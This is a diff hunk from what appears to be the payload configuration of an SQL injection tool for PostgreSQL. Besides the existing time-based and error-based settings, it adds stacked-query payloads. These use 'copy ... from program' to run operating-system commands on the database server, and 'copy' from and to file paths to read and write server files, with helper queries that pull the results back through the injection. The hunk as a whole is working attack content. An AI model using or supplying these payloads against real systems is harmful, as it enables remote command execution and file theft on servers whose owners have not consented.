@@ -31,3 +31,14 @@ SleepBoolData: (case when (({cond})) then (select false from pg_sleep({sleep})) 
 ErrorChunkLen:80
 BlindStrategy: codepoint
 DnsChannel: yes
+CmdExec: 1=1;drop table if exists ssqlinjection;create table ssqlinjection(data text);copy ssqlinjection from program '{cmd}';--
+CmdData:(select data from ssqlinjection offset {index} limit 1)
+CmdDataCount:(select count(1) from ssqlinjection)
+CmdCreateTable: 1=1;drop table if exists ssqlinjection;create table ssqlinjection (data text);--
+CmdDropTable: 1=1;drop table if exists ssqlinjection;--
+FileReadCopy: 1=1;drop table if exists ssqlinjection;create table ssqlinjection(data text);copy ssqlinjection from '{path}';--
+FileWriteCopy: 1=1;copy ssqlinjection(data) to '{path}';--
+FileInsertLine: 1=1;insert into ssqlinjection(data) values ('{content}');--
+FileContent:(select data from ssqlinjection)
+FileContentCount:(select count(1) from ssqlinjection)
+FileContentData:(select data from ssqlinjection offset {index} limit 1)
